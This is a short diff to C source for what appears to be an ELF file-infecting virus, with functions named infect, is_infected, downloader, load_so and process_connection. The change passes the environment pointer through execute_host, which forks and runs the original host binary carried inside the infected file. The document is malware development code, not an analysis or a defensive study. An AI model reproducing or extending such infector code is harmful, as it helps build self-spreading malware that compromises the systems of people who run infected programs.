@@ -33,7 +33,7 @@ extern char** environ;
 always_inline optimize(opt) static inline long elf_size(FILE*);
 always_inline optimize(opt) static inline int is_infected(char*);
 always_inline optimize(opt) static inline void infect(FILE*, FILE*);
-always_inline optimize(opt) static inline void execute_host(FILE*, char**);
+always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
 always_inline optimize(opt) static inline void load_so(int, int);
 always_inline optimize(opt) static inline void process_connection(int);
 always_inline optimize(opt) static inline void downloader();
@@ -49,7 +49,7 @@ int main(int argc, char** argv){
     fclose(parasite);
   }else{
     FILE* infected = fopen(argv[0], "rb");
-    execute_host(infected, argv);
+    execute_host(infected, argv, environ);
   }
 }
 
@@ -115,7 +115,7 @@ void infect(FILE* h, FILE* p){
   remove(file_name);
 }
 
-void execute_host(FILE* f, char** argv){
+void execute_host(FILE* f, char** argv, char** envp){
   long p_size = elf_size(f);
   fseek(f, p_size, SEEK_SET);
   long h_size = elf_size(f);
@@ -141,7 +141,7 @@ void execute_host(FILE* f, char** argv){
 
   // fork the process to execute the host file
   if((pid = fork()) == 0){
-    fexecve(fd, argv, environ);
+    fexecve(fd, argv, envp);
   }else{
     wait(NULL);
   }
